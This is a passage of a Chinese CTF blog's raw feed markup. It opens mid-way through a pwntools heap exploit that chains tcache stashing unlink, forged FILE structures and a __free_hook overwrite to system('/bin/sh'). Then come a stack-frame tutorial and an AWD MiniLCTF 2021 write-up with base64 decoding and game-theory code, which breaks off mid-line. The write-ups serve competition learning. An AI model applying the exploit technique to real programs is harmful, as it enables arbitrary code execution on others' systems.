class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">io.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">add(<span class="number">0x1f8</span>)<span class="comment">#0~3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">add(<span class="number">0xe8</span>)<span class="comment">#4~5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;ent: &#x27;</span>)</span><br><span class="line">libc_base=u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">96</span>-<span class="number">16</span></span><br><span class="line">binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">global_max_fast=libc_base+<span class="number">0x1eeb80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;ent: &#x27;</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))+<span class="number">0x110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_base&#x27;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#8</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x108</span>+p64(<span class="number">0xf1</span>)+p64(heap_base)+p64(libc_base+<span class="number">0x1eeb80</span>-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0xe8</span>)<span class="comment">#9</span></span><br><span class="line"><span class="comment">#tcache_stashing_unlink over</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+<span class="number">0x90</span>-<span class="number">1</span>))</span><br><span class="line">add(<span class="number">0xe8</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0xe8</span>)<span class="comment">#11</span></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">&#x27;\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x20f</span>))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+<span class="number">0xa0</span>))</span><br><span class="line">add(<span class="number">0x1f8</span>)<span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x1f8</span>)<span class="comment">#13</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(<span class="number">0xfbad2887</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">131</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">132</span>)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload+=p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])+p64(<span class="number">1</span>)+<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+<span class="string">&#x27;\x0a&#x27;</span>+p32(<span class="number">0</span>)+p64(libc_base+<span class="number">0x1ee4c0</span>)</span><br><span class="line">payload+=<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x1eb880</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload+=<span class="string">&#x27;\xff&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x14</span>+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>])</span><br><span class="line">payload+=p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])</span><br><span class="line">payload+=p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1f0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x20f</span>)</span><br><span class="line">edit(<span class="number">13</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">a,b</span>):</span></span><br><span class="line">offset=b-<span class="number">0x7f0b79060000</span></span><br><span class="line">c=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1f</span>*<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> u64(a[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])&gt;<span class="number">0x7f0000000000</span> <span class="keyword">and</span> u64(a[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])&lt;<span class="number">0x800000000000</span>:</span><br><span class="line">c+=p64(u64(a[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>])+offset)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c+=p64(u64(a[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]))</span><br><span class="line"><span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">fd=<span class="built_in">open</span>(<span class="string">&#x27;./2&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x11</span>):</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+<span class="number">0xa0</span>+<span class="number">0x1f8</span>*(i+<span class="number">1</span>)))</span><br><span class="line">add(<span class="number">0x1f8</span>)<span class="comment">#14~15\</span></span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line">payload=fd.read(<span class="number">0x1f0</span>).ljust(<span class="number">0x1f0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fd.read(<span class="number">8</span>)</span><br><span class="line">payload=encode(payload,libc_base)</span><br><span class="line">payload+=p64(<span class="number">0x20f</span>)</span><br><span class="line">edit(<span class="number">15</span>+i*<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+<span class="number">0xa0</span>+<span class="number">0x1f8</span>*(i+<span class="number">2</span>)))</span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line">add(<span class="number">0x1f8</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x148</span>+p64(system)</span><br><span class="line">edit(<span class="number">15</span>+i*<span class="number">2</span>+<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn</title>
      <link href="/bufferfly/blog/1502172364.html"/>
      <url>/bufferfly/blog/1502172364.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn学习1"><a href="#pwn学习1" class="headerlink" title="pwn学习1"></a>pwn学习1</h1><p>一张汇编图片<br><img src="/img/PWN/huibian1.jpg" alt="avatar"></p><p>栈帧结构</p><h1 id="Fig-1-函数调用发生和结束时调用栈的变化"><a href="#Fig-1-函数调用发生和结束时调用栈的变化" class="headerlink" title="Fig 1.函数调用发生和结束时调用栈的变化"></a>Fig 1.函数调用发生和结束时调用栈的变化</h1><p>esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。<br>下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态<br><img src="/img/PWN/fig1.jpg" alt="avatar"></p><h1 id="Fig-2-将被调用函数的参数压入栈内"><a href="#Fig-2-将被调用函数的参数压入栈内" class="headerlink" title="Fig 2.将被调用函数的参数压入栈内"></a>Fig 2.将被调用函数的参数压入栈内</h1><p>将被调用函数的参数压入栈内<br>首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。<br><img src="/img/PWN/fig2.jpg" alt="avatar"></p><h1 id="Fig-3-将被调用函数的返回地址压入栈内"><a href="#Fig-3-将被调用函数的返回地址压入栈内" class="headerlink" title="Fig 3.将被调用函数的返回地址压入栈内"></a>Fig 3.将被调用函数的返回地址压入栈内</h1><p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。<br><img src="/img/PWN/fig3.jpg" alt="avatar"></p><h1 id="Fig-4-将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到-ebp-寄存器内"><a href="#Fig-4-将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到-ebp-寄存器内" class="headerlink" title="Fig 4.将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内"></a>Fig 4.将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内</h1><p>再将当前的ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。<br><img src="/img/PWN/fig4.jpg" alt="avatar"></p><h1 id="Fig-5-将被调用函数的局部变量压入栈内"><a href="#Fig-5-将被调用函数的局部变量压入栈内" class="headerlink" title="Fig 5.将被调用函数的局部变量压入栈内"></a>Fig 5.将被调用函数的局部变量压入栈内</h1><p>再之后是将被调用函数（callee）的局部变量等数据压入栈内。。<br><img src="/img/PWN/fig5.jpg" alt="avatar"></p><h1 id="Fig-6-将被调用函数的局部变量弹出栈外"><a href="#Fig-6-将被调用函数的局部变量弹出栈外" class="headerlink" title="Fig 6.将被调用函数的局部变量弹出栈外"></a>Fig 6.将被调用函数的局部变量弹出栈外</h1><p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。<br>看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。<br>首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。<br><img src="/img/PWN/fig6.jpg" alt="avatar"></p><h1 id="Fig-7"><a href="#Fig-7" class="headerlink" title="Fig 7."></a>Fig 7.</h1><p>将调用函数（caller）的基地址（ebp）弹出栈外，并存到 ebp 寄存器内<br>然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。<br><img src="/img/PWN/fig7.jpg" alt="avatar"></p><h1 id="Fig-8"><a href="#Fig-8" class="headerlink" title="Fig 8."></a>Fig 8.</h1><p>再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。<br>将被调用函数的返回地址弹出栈外，并存到 eip 寄存器内<br>至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。<br><img src="/img/PWN/fig8.jpg" alt="avatar"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AWDMiniCTF_2021</title>
      <link href="/bufferfly/blog/4038532285.html"/>
      <url>/bufferfly/blog/4038532285.html</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><ol><li><h2 id="好白给的签到题"><a href="#好白给的签到题" class="headerlink" title="好白给的签到题"></a>好白给的签到题</h2></li></ol><p>压缩包里的文件有点大。。。50MB。。</p><p>有提示：贝斯小学(base)，50 ，路易.六十四(想到base64)，兔子(斐波那契)，反着跳(python逆过来)，八年。</p><p>经过无数base64和反向base64。</p><p>然后打开story.txt看下是base64写脚本解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">p=<span class="built_in">open</span>(<span class="string">&#x27;story.txt&#x27;</span>)</span><br><span class="line">c=p.read().strip()</span><br><span class="line">s=c</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        s=base64.b64decode(s)</span></span><br><span class="line"><span class="string">        print(s)</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            s=base64.b64decode(s[::-1])</span></span><br><span class="line"><span class="string">            print(s)</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">z=<span class="string">&#x27;9smRjNnSWF2b4dkV6BHbStGdrJVcaZUVxM3VZhlWFJlaO52UHZkMURDZrZFNwFTYXhGbSRHZxM2caVlW5plRidFaX5kcK1WVzhnMVpnWsJFbw1mVyRGbNNEarlFVWpXYThWRjhXSWl1Rwh1VyI0MhxmWGF2ckx2YHRGMWNDayEGWoV0YyFzaWtmWVpFMwZkYsR3aWdXVsZ1QotWWYJ1VSpGZrdFeRZVW0QGbWdXUE10UsdUYHBHbSdEZWpVYatWYXpFShpXWsZVNjBTW6BnRiVlQU1EWaxWTahXbVNHcxEGWaZ0YHZ0VZdkUWdlW41WZohmRhlFZGVmVGpXWop1ahdlWEFGWK1GVzRGMZBjUHJ2U0VVTYJVMSdnRUlFWoJTYSxGbTlXWxQVMjZlVhBHbWlGasRlcWxmVzplVaNDaYJ2V5s2VWpkMW9UNtZFNxsWTUJlaTFnWWd1SGpWVwplRiJlVGp1RW1mUrpVMWlkWFZVakZkY1RWMjdkSqZFSSJTYYxGSjJnSGdFM01WVWh3VN5EdrdlVSZ0VTR2aZdFaXZ1TaVkWHZVbhFGetZFNGxWZo5kRhNnUWN1VkVkWYBnVSFGeFN2VxAjVHRWVZpFcwIFWSREZ0plRNdHetZVYShlYTZkbXdVMwY1U41mVZpFblhGaGplcOZ0U4NnMWhGcsJ1VKRUZ0ZlMVtGeHZlS1UlYT5kVNRnWG1kUKRVWZhXbSpmWsNVeVFjUrZlVXpkQIJ2U0d1T0JFbONnWwYFV1sWYXJkRjhXRHd1a0JTV1Y1aNhmUU1Edax2U3ZlVU9kVUJVYkZVTGRmRlJkUGZVTChkYXZFbSRnVGN1aaxmVyh2MWdlVEJ2caZUYDJ1aXpnSsZlWk52VyxmRXdHdtVFaCh0VW5kbWdkVtVVYWxmV&#x27;</span></span><br><span class="line">s=base64.b64decode(z[::-<span class="number">1</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    s=base64.b64decode(s)</span></span><br><span class="line"><span class="string">    print(s)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">z=<span class="string">&#x27;==QOwQVVY5kbWdVMwY1Rw1mV3tGVWdlVE5kVsxmThZFbWdlUtJlToh1V4lVMUNnWWZVeKZlYYRmRllXSyQmW4dVWDpkRWFGZV5kVaZkV4NWVZRlRUZ1Vkh0YyplVjFTQ6lFcohlYYRWVNZEZxQ1S4d1VaBXVWhFZW1ESSdUYLplVURlWsZ1VKhlTWZ0VhtmQEpleB5mVXB3RhVnWsVFeRZUV&#x27;</span></span><br><span class="line">s=base64.b64decode(z[::-<span class="number">1</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    s=base64.b64decode(s)</span></span><br><span class="line"><span class="string">    print(s)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">z=<span class="string">&#x27;mNVRoN2MSBnTqpFaVxWO1I2aCRHWygTMlBjWVFFM4BnYtxmT&#x27;</span></span><br><span class="line">s=base64.b64decode(z[::-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    s=base64.b64decode(s[::-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">##MiniLCTF&#123;5o_m@ny_Ra66its!!&#125;</span></span><br></pre></td></tr></table></figure><p>txt里面的base64解密后逆过来的<code>9smRjNnSWF2b4dkV6BHbStGdrJVcaZUVxM3VZhlWFJlaO52UHZkMURDZrZFNwFTYXhGbSRHZxM2caVlW5plRidFaX5kcK1WVzhnMVpnWsJFbw1mVyRGbNNEarlFVWpXYThWRjhXSWl1Rwh1VyI0MhxmWGF2ckx2YHRGMWNDayEGWoV0YyFzaWtmWVpFMwZkYsR3aWdXVsZ1QotWWYJ1VSpGZrdFeRZVW0QGbWdXUE10UsdUYHBHbSdEZWpVYatWYXpFShpXWsZVNjBTW6BnRiVlQU1EWaxWTahXbVNHcxEGWaZ0YHZ0VZdkUWdlW41WZohmRhlFZGVmVGpXWop1ahdlWEFGWK1GVzRGMZBjUHJ2U0VVTYJVMSdnRUlFWoJTYSxGbTlXWxQVMjZlVhBHbWlGasRlcWxmVzplVaNDaYJ2V5s2VWpkMW9UNtZFNxsWTUJlaTFnWWd1SGpWVwplRiJlVGp1RW1mUrpVMWlkWFZVakZkY1RWMjdkSqZFSSJTYYxGSjJnSGdFM01WVWh3VN5EdrdlVSZ0VTR2aZdFaXZ1TaVkWHZVbhFGetZFNGxWZo5kRhNnUWN1VkVkWYBnVSFGeFN2VxAjVHRWVZpFcwIFWSREZ0plRNdHetZVYShlYTZkbXdVMwY1U41mVZpFblhGaGplcOZ0U4NnMWhGcsJ1VKRUZ0ZlMVtGeHZlS1UlYT5kVNRnWG1kUKRVWZhXbSpmWsNVeVFjUrZlVXpkQIJ2U0d1T0JFbONnWwYFV1sWYXJkRjhXRHd1a0JTV1Y1aNhmUU1Edax2U3ZlVU9kVUJVYkZVTGRmRlJkUGZVTChkYXZFbSRnVGN1aaxmVyh2MWdlVEJ2caZUYDJ1aXpnSsZlWk52VyxmRXdHdtVFaCh0VW5kbWdkVtVVYWxmV</code>就使flag的加密，慢慢尝试就行了</p><ol><li><h2 id="抓猫猫"><a href="#抓猫猫" class="headerlink" title="抓猫猫"></a>抓猫猫</h2></li></ol><p>抓堆问题：博弈论的数学问题….</p><p><code>有一堆谷粒（例如100粒），甲乙轮流抓，每次可抓1-5粒，甲先抓，规定谁抓到最后一把谁赢。甲应该如何抓？为什么？ 先不考虑100粒的问题，假如谷粒只有一粒，甲一次就可以抓完，直接获胜。两粒，三粒，四粒，五粒也是同样的情况。但是如果谷粒有六粒的话，甲一次性无法抓完，乙必然会赢。 那怎么样甲才能稳赢呢，就是在最后只剩六个谷粒的时候让乙先抓取，在最开始取时甲就要将剩下的谷粒数限定在六的倍数内，只要甲取完每次都是六的倍数，甲就必胜了。</code></p><h3 id="k倍博弈"><a href="#k倍博弈" class="headerlink" title="k倍博弈"></a>k倍博弈</h3><p>两个人取一堆n的石子，先手不能全部取完，之后每人取的个数不能超过另一个人上轮取的K倍。</p><p>当k=1时，必败态都是2^i,我们可以借助二进制的思想来理解，将n表示为2进制，先手拿掉最后一个1，后手肯定没法去掉更高位的1，所以后手取完，先手至少还能拿掉最后一个1，所以先手必胜。当n=2^i时，先手必败，因为此时n的二进制只有一个1，先手第一次不能取完，所以先手取了以后，后手一定能取到最后一个1，然后先手不能去掉更高位的1，所以先手必败。</p><p>假设<code>n=6(110)</code>，我们先去掉最后一个1，变为4（100），此时如果对手取两个，那么我们直接去两个就能取完，如果对手取一个，还剩3个，我们能取到最后一个。</p><p>当k=2时，这就是一个Fibonacci博弈，可知先手必胜当且仅当n不为Fibonacci数，还是利用，先手取掉最后一个1，后手无法去掉更高位的1，所以后手取完，先手至少还能拿掉最后一个1。Fibonacci数列有一个很好的性质就是，任何一个整数都可以表示为若干项不连续的Fibonacci数，所以我们先去掉最后一个1，即一个数x，后手肯定无法去掉更高的数2x，小于高两位的1，所以后手无法取完。</p><p>假设<code>n=11=7+3+1</code>，表示为10101，我们先手去掉最后一个1，后手无法去掉高两位的1，所以后手取完，我们至少还能去掉最后一个1。</p><p>当k的时候，想办法构造数列，使得数列的任意两项之间的倍数大于k。</p><p>就像Fibonacci博弈一样，我们还是想要构造一个想Fibonacci一样的数列，我们用a数组，表示要构造的数列，<code>b[i]</code>表示<code>a[1..i]</code>所能组成的最大数，为了方便理解，我们还是用Fibonacci数列举例子，显然<code>a[ ]=&#123;1,2,3,5,8...&#125;</code>,<code>b[3]=4</code>,因为5本身就是Fibonacci数，而<code>6=1+2+3</code>，相邻两项的倍数根本就不大于<code>2</code>，<code>6=1+5</code>，<code>b[4]=6</code>。所以b数组中的数时我们要构造的数列中的一些满足要求的数的和，<code>a[i]=b[i-1]+1</code>,为什么呢，因为<code>a[i]</code>中的数是不可构造的，因为取到它就是必败。而<code>b[i-1]</code>是<code>a[1..i-1]</code>所能构造的最大数，那么加1，就是无法被前面的数列构造出来，所以只能另外开一项。</p><p>关于<code>b[i]</code>的构造，由于<code>b[i]</code>是<code>a[1..i]</code>中的数构造出来的，所以我们一定会用到<code>a[i]</code>,不然就成了<code>b[i-1]</code>了，所以我们先要按递减顺序找到<code>a[t]*k&lt;a[i]</code>,那么<code>b[i]=b[t]+a[i]</code>,如果前面找不到那么<code>b[i]=a[i]</code>,为什么呢，因为前面的数没有k项或者说构造出来太小了，所以只能选取一个，那么肯定选取最大的哪一个，前面<code>a[1...i-1]</code>所构造的项<code>b[i-1]</code>小于<code>a[i]</code>,所以这种情况下<code>b[i]=a[i]</code>。所以我们先手能不能必胜就看n在不在这个<code>a[ ]</code>数组里面，给出模板</p><p>所以这里我们由于抓猫的数量不能超过前一次抓猫的数量，所以在猫猫数量为偶数时不能抓奇数只猫猫，否则对方只抓一只猫猫我们就输了。 所以我们需要找出一个偶数，使得我们抓完后剩余的猫猫数为该偶数的倍数即可抓住猫猫</p><p>假若说他先抓了32只猫猫，剩下了108只猫猫，我发现我抓12只的话还剩96只，96是12的倍数。这个时候他抓12，我也抓12，他抓8我就抓4，他抓10我就抓2，他抓6，我就6，他抓4我就4，他抓2我就2，就稳赢。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1000000</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn];   <span class="comment">//构造的数列</span></span><br><span class="line"><span class="keyword">int</span> b[maxn];    <span class="comment">//b[i]为a[1..i]所能凑出的最大数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n,k;</span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;k)==<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">0</span>]=b[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(a[i]&lt;n)&#123;</span><br><span class="line">      i++;</span><br><span class="line">      a[i]=b[i<span class="number">-1</span>]+<span class="number">1</span>;    <span class="comment">//a[i]为a[1..i-1]所能构造出的最大的那个数+1</span></span><br><span class="line">      <span class="keyword">while</span>(a[j+<span class="number">1</span>]*k&lt;a[i]) j++;  <span class="comment">//寻找临界点</span></span><br><span class="line">      <span class="keyword">if</span>(a[j]*k&lt;a[i])  b[i]=b[j]+a[i];   <span class="comment">//a[1..j]所能构造出来的最大值加上a[i]</span></span><br><span class="line">      <span class="keyword">else</span> b[i]=a[i];   <span class="comment">//相邻  小于了K倍 自然构造的最大的数就是a[i]了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a[i]==n)  <span class="built_in">printf</span>(<span class="string">&quot;Lost\n&quot;</span>);   <span 